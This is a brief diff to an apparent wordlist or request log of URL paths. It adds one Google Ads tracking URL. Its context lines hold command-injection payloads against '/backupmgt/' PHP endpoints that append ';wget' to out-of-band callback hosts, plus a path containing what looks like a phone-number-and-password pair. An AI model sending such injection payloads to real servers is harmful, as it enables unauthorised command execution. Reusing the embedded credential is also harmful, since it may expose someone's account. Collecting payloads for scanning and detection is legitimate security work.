@@ -30932,3 +30932,4 @@ http://64.233.170.113/
 /backupmgt/localJob.php?session=fail;wget+http://d1g6fujpu1sm2rahe0kghzjop1bc764nz.oast.site;
 /backupmgt/pre_connect_check.php?auth_name=fail;wget+http://d1g6fujpu1sm2rahe0kgadz57iesd4r94.oast.site;
 /index.php:0552919040:Qwert9050
+/?gad_source=2&gad_campaignid=20619651796&gclid=Cj0KCQjwyIPDBhDBARIsAHJyyViFhTnHHsuEGO2ZWkdYa6wWmGOzXQDgPKCv2SIdKU-tL4hjh7URbEcaApiFEALw_wcB
